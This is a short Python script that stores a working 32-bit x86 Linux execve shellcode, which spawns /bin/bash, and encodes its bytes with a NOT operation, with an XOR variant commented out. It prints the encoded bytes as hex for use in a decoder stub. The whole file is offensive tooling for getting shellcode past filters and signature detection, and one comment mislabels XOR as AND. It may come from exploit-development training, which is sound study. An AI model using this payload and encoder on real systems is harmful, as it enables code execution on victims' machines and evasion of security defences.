#!/usr/bin/python3
# Python XOR and NOT bits encoders

shellcode = b"\x31\xdb\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
encoded_shellcode = ""

print('Shellcode len: {}'.format(len(shellcode)))
print('Encoded shellcode ...')

for x in bytearray(shellcode):
	# 0xAA: Byte used to encode the shellcode using the AND operator
	#y = x ^ 0xAA
	# NOT encoder
	y = ~x
	encoded_shellcode += '{},'.format(hex(y & 0xFF))

# Remove minus sign created by the NOT encoder
encoded_shellcode = encoded_shellcode.replace('-','')
# Print an encoded shellcode format
print(encoded_shellcode)


